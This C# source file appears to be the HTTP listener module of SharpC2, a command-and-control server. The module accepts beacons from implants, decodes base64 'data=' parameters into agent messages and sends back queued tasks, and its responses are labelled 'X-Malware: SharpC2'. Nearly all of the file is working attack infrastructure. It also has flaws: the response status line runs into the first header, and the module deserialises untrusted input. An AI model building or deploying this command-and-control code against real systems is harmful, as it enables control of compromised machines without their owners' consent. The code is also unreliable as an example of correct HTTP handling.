using Shared.Models;
using Shared.Utilities;

using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

using TeamServer.Controllers;
using TeamServer.Interfaces;

namespace TeamServer.CommModules
{
    public class HTTPCommModule : ICommModule
    {
        ListenerHTTP Listener;
        AgentController Agent;

        ModuleStatus Status = ModuleStatus.Starting;
        Socket Socket = new Socket(SocketType.Stream, ProtocolType.IP);

        Queue<AgentMessage> Inbound = new Queue<AgentMessage>();

        ManualResetEvent AllDone = new ManualResetEvent(false);

        public HTTPCommModule(ListenerHTTP Listener)
        {
            this.Listener = Listener;
        }

        public void Init(AgentController Agent)
        {
            this.Agent = Agent;
        }

        public bool RecvData(out AgentMessage Message)
        {
            if (Inbound.Count > 0)
            {
                Message = Inbound.Dequeue();
                return true;
            }
            else
            {
                Message = null;
                return false;
            }
        }

        public void Start()
        {
            Status = ModuleStatus.Running;

            try
            {
                Socket.Bind(new IPEndPoint(IPAddress.Parse("0.0.0.0"), 8080));
                Socket.Listen(100);
            }
            catch
            {
                Status = ModuleStatus.Terminated;
                return;
            }

            Task.Factory.StartNew(delegate ()
            {
                while (Status == ModuleStatus.Running)
                {
                    AllDone.Reset();
                    Socket.BeginAccept(new AsyncCallback(AcceptCallback), Socket);
                    AllDone.WaitOne();
                }
            });
        }

        void AcceptCallback(IAsyncResult ar)
        {
            AllDone.Set();

            var listener = ar.AsyncState as Socket;

            if (Status == ModuleStatus.Running)
            {
                var handler = listener.EndAccept(ar);
                var state = new HTTPStateObject { workSocket = handler };
                handler.BeginReceive(state.buffer, 0, HTTPStateObject.BufferSize, 0, new AsyncCallback(ReadCallback), state);
            }
        }

        void ReadCallback(IAsyncResult ar)
        {
            var state = ar.AsyncState as HTTPStateObject;
            var handler = state.workSocket;
            var bytesRead = 0;

            try
            {
                bytesRead = handler.EndReceive(ar);
            }
            catch (SocketException)
            {
                // client socket has gone away for "reasons".
            }

            if (bytesRead > 0)
            {
                var dataReceived = state.buffer.TrimBytes();
                var webRequest = Encoding.UTF8.GetString(dataReceived);
                var regex = Regex.Match(webRequest, "data=([^\\s]+)");

                AgentMessage messageIn = null;
                byte[] messageOut = null;

                if (regex.Captures.Count > 0)
                {
                    messageIn = Utilities.DeserialiseData<AgentMessage>(Convert.FromBase64String(regex.Groups[1].Value));

                    if (messageIn != null)
                    {
                        Inbound.Enqueue(messageIn);

                        var task = Agent.GetAgentTask(messageIn.AgentID);

                        if (task != null)
                        {
                            messageOut = Get200Response(Utilities.SerialiseData(task));
                        }
                        else
                        {
                            messageOut = Get200Response();
                        }
                    }
                }
                else
                {
                    messageOut = Get404Response();
                }

                handler.BeginSend(messageOut, 0, messageOut.Length, 0, new AsyncCallback(SendCallback), handler);
            }
        }

        void SendCallback(IAsyncResult ar)
        {
            try
            {
                var handler = ar.AsyncState as Socket;
                var bytesSent = handler.EndSend(ar);
                handler.Shutdown(SocketShutdown.Both);
                handler.Close();
            }
            catch (SocketException)
            {
                
            }
        }

        public void Stop()
        {
            Status = ModuleStatus.Stopped;
            Socket.Close();
        }

        byte[] Get404Response()
        {
            var sb = new StringBuilder("HTTP/1.1 404 Not Found");
            sb.AppendLine("X-Malware: SharpC2");

            var now = DateTime.UtcNow.ToString("ddd, MMM yyyy HH:mm:ss UTC");
            sb.AppendLine($"Date: {now}");
            sb.AppendLine("Content-Type: text/plain");
            sb.AppendLine("Content-Length: 0");
            sb.AppendLine();

            return Encoding.UTF8.GetBytes(sb.ToString());
        }

        byte[] Get200Response()
        {
            var sb = new StringBuilder("HTTP/1.1 200 OK");
            sb.AppendLine("X-Malware: SharpC2");

            var now = DateTime.UtcNow.ToString("ddd, MMM yyyy HH:mm:ss UTC");

            sb.AppendLine($"Date: {now}");
            sb.AppendLine("Content-Type: text/plain");
            sb.AppendLine("Content-Length: 0");
            sb.AppendLine();

            return Encoding.UTF8.GetBytes(sb.ToString());
        }

        byte[] Get200Response(byte[] data)
        {
            var sb = new StringBuilder("HTTP/1.1 200 OK");
            sb.AppendLine("X-Malware: SharpC2");

            var now = DateTime.UtcNow.ToString("ddd, MMM yyyy HH:mm:ss UTC");

            sb.AppendLine($"Date: {now}");
            sb.AppendLine("Content-Type: text/plain");
            sb.AppendLine($"Content-Length: {data.Length}");
            sb.AppendLine();

            var headers = Encoding.UTF8.GetBytes(sb.ToString());
            var final = new byte[data.Length + headers.Length];

            Buffer.BlockCopy(headers, 0, final, 0, headers.Length);
            Buffer.BlockCopy(data, 0, final, headers.Length, data.Length);

            return final;
        }
    }
}